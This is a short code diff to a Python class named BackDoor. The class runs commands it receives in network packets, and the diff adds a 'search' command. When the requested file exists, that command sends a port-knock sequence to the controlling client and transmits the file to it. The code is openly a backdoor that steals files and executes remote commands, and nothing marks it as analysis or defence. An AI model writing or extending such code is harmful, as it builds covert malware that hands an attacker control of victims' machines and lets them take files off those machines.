@@ -427,11 +427,25 @@ class BackDoor:
 
     def process_packet(self, data):
         stripped_msg = data.strip(self.flag_begin).rstrip(self.flag_close)
-        if stripped_msg.split()[0] == "search":
-            print("search")
+        split_msg = stripped_msg.split()
+        if split_msg[0] == "search":
+            self.search(split_msg[1])
         else:
             print(f"Executing: {stripped_msg}")
             self.execute(stripped_msg)
+
+    def search(self, file: str):
+        """Searches for a file in directory"""
+        file_exists = os.path.exists(file)
+        if file_exists:
+            print("Sending Knock Sequence")
+            self.port_knock()
+            # Give time for client to open ports
+            time.sleep(0.5)
+            # Send created file
+            self.prepare_data(file)
+        else:
+            print("Not exist, my man")
 
     def set_client(self, ip):
         print(f"Setting client ip as {ip}")
